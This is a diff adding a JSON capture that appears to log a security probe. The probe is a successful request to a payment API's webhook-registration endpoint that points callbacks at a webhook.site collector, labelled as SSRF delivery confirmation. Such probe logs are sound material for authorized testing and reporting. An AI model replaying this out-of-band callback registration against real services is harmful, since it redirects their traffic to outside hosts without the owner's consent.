@@ -1,0 +1,31 @@
+{
+  "captured_at": "2026-05-28T02:28:46.786947+00:00",
+  "attempt_id": "P1-ssrf-delivery-confirm",
+  "elapsed_ms": 579.78,
+  "outcome": "success",
+  "request": {
+    "method": "POST",
+    "url": "https://api.balampay.com/webhooks/register",
+    "headers": {
+      "Content-Type": "application/json",
+      "x-api-key": "REDACTED(40)",
+      "Authorization": "REDACTED(872)"
+    },
+    "body": {
+      "webhook_url": "https://webhook.site/3fa5ca2e-8761-48f6-b93d-fb7897f95a29",
+      "client_uuid": "<client_id-redacted>",
+      "secret": "REDACTED(32)"
+    }
+  },
+  "response": {
+    "status": 200,
+    "headers": {
+      "content-type": "application/json",
+      "x-amzn-requestid": "f8761a40-862f-4766-80cc-c6962494bc36"
+    },
+    "body": {
+      "message": "Webhook registered successfully"
+    }
+  },
+  "context": "Probe 1 — SSRF delivery confirmation. Step=stepG-cleanup-final-overwrite"
+}
